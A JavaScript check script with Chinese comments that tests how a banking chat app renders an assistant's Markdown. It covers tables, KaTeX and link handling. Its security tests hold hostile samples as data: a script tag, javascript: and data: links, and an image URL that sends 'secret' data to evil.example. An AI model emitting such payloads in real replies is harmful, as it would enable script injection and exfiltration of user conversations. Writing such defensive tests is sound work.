/**
 * 助手回复的 Markdown / 公式渲染检查。
 *
 * 为什么不是"截个图看看"：模型输出是**不可信内容**，这里的断言有一半是安全断言
 * （原始 HTML 不许注入、图片不许自动加载、javascript: 链接不许成链），
 * 截图看不出这些。
 *
 * 做法：直接 import 应用里真正在跑的那个组件（app/src/components/agent/Markdown.tsx），
 * 用 react-dom/server 渲成静态 HTML 再断言 —— 不是照源码抄一遍实现来"验证"它。
 *
 *   node --import ./tools/ts-resolve-hook.mjs tools/check-markdown.mjs
 */
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { Markdown } from '../app/src/components/agent/Markdown.tsx'

let failures = 0
const report = (ok, title, lines = []) => {
  if (!ok) failures += 1
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${title}`)
  for (const line of lines) console.log(`      ${line}`)
}

/** 把一段 Markdown 渲染成 HTML。 */
const render = (text) => renderToStaticMarkup(createElement(Markdown, { text }))

/* ------------------------------------------------------------ 基本格式 */

const bold = render('余额是 **12,864.50 CNY**，请注意。')
report(bold.includes('<strong>12,864.50 CNY</strong>') && !bold.includes('**'),
  '粗体渲染成 <strong>，且不残留 **', [bold.slice(0, 120)])

const list = render('可选：\n\n- 转账\n- 查余额\n- 锁卡')
report(list.includes('<ul>') && (list.match(/<li>/g) ?? []).length === 3,
  '无序列表渲染成 <ul>/<li>')

const ordered = render('1. 第一步\n2. 第二步')
report(ordered.includes('<ol>') && (ordered.match(/<li>/g) ?? []).length === 2,
  '有序列表渲染成 <ol>/<li>')

const heading = render('## 账户余额')
report(heading.includes('<h2>') && heading.includes('账户余额'),
  '标题渲染成 <h2>')

const code = render('用 `npm run dev` 启动。')
report(code.includes('<code>npm run dev</code>'), '行内代码渲染成 <code>')

/* ------------------------------------------------------------ GFM 表格 */

const table = render([
  '| 项目 | 详情 |',
  '| --- | --- |',
  '| 账户类型 | 招财猫银行 Ⅰ 类户 |',
  '| 余额 | 12,864.50 CNY |',
].join('\n'))
report(table.includes('<table') && table.includes('<th>项目</th>') && table.includes('<td>12,864.50 CNY</td>'),
  'GFM 表格渲染成 <table>（这正是原先显示成 `|---|` 的那种）', [table.slice(-160)])
// 断言表格**直接**套在滚动容器里。原来写成 includes('overflow-x-auto') 是句废话
// ——那个类名在外层 div 上永远都在，表根本没渲出来它也照样 PASS。
report(table.includes('overflow-x-auto"><table'), '宽表格套了横向滚动容器（不会撑破气泡）')

/* ------------------------------------------------------------ 换行 */

const breaks = render('第一行\n第二行')
report(breaks.includes('<br/>') || breaks.includes('<br>'),
  '单个换行按换行渲染（聊天里的行不该被合并成一段）')

/* ------------------------------------------------------------ KaTeX */

const inlineMath = render('公式是 $E = mc^2$ 这样写的。')
report(inlineMath.includes('class="katex"') && !inlineMath.includes('$E'),
  '行内公式渲染成 KaTeX', [inlineMath.slice(0, 160)])

const displayMath = render('$$\n\\int_0^1 x\\,dx = \\frac{1}{2}\n$$')
report(displayMath.includes('katex-display') && displayMath.includes('katex'),
  '块级公式渲染成 KaTeX 的行间模式')

const badMath = render('$\\frac{1}{$')
report(badMath.includes('katex'),
  '公式写错时不炸整条回复（throwOnError: false）')

/* ------------------------------------------------------------ 安全断言 */

const rawHtml = render('正常文字 <script>alert(1)</script> 和 <b>粗</b>')
report(!rawHtml.includes('<script') && !rawHtml.includes('<b>粗</b>'),
  '原始 HTML 不被注入 DOM（没挂 rehype-raw）', [rawHtml.slice(0, 160)])
report(rawHtml.includes('&lt;script&gt;') || rawHtml.includes('&lt;script'),
  '原始 HTML 以文本形式保留（客户仍能看到模型写了什么）')

const img = render('![余额截图](https://evil.example/pixel.png?data=secret)')
report(!img.includes('<img'),
  'Markdown 图片不被渲染成 <img>（防"把对话内容编码进 URL 外带"与追踪像素）', [img.slice(0, 160)])
report(img.includes('余额截图'), '图片退化成文字后仍保留 alt 信息')

const jsLink = render('[点我](javascript:alert(1))')
report(!jsLink.includes('javascript:') && !jsLink.includes('<a '),
  'javascript: 链接不被渲染成链接（react-markdown 先抹成空地址，组件再把空地址退化成文本）', [jsLink.slice(-140)])

const dataLink = render('[点我](data:text/html;base64,PHNjcmlwdD4=)')
report(!dataLink.includes('href="data:'), 'data: 链接不被渲染成链接')

const httpsLink = render('[招财猫](https://bank.example.com/help)')
report(httpsLink.includes('href="https://bank.example.com/help"')
  && httpsLink.includes('rel="noopener noreferrer"')
  && httpsLink.includes('target="_blank"'),
  'http(s) 链接正常渲染，并带 noopener/noreferrer')

// react-markdown 会把内部的 hast 节点作为 `node` 传给自定义组件；
// 忘了摘掉就会在页面上渲出 node="[object Object]"。这是个真被渲出来过的 bug。
const leaked = [bold, list, table, inlineMath, img, httpsLink].filter((html) => html.includes('node="[object'))
report(leaked.length === 0,
  '自定义元素没有把内部 node 属性泄漏到 DOM', leaked.length ? [`${leaked.length} 处泄漏`] : [])

/* ------------------------------------------------- 接线检查（防漂移） */

const { readFileSync } = await import('node:fs')
const { fileURLToPath } = await import('node:url')
const read = (relative) => readFileSync(fileURLToPath(new URL(relative, import.meta.url)), 'utf8')

const supportPage = read('../app/src/components/agent/ChatWorkspace.tsx')
report(/import\('\.\/Markdown'\)/.test(supportPage)
  && /<Markdown text=\{item\.text\} \/>/.test(supportPage),
  '智能客服的助手气泡确实用了这个组件（不是写好了没接线）')
report(/const Markdown = lazy\(/.test(supportPage),
  'Markdown 是懒加载的（约 430KB，不该让全部页面一起背）')
const userBubble = supportPage.slice(supportPage.indexOf('function UserBubble('), supportPage.indexOf('function MessageBubble('))
report(userBubble.includes('{item.text}') && !userBubble.includes('<Markdown')
  && /Suspense fallback=\{<span className="whitespace-pre-wrap">/.test(supportPage),
  '用户自己说的话仍按纯文本显示（他打的 `#`/`*` 不该变成格式）')

const mainEntry = read('../app/src/main.tsx')
report(/import 'katex\/dist\/katex\.min\.css'/.test(mainEntry),
  'KaTeX 样式在入口被引入（否则公式会挤成一堆字符）')

console.log()
console.log(failures === 0 ? 'check-markdown: 全部通过' : `check-markdown: ${failures} 项未通过`)
process.exit(failures === 0 ? 0 : 1)
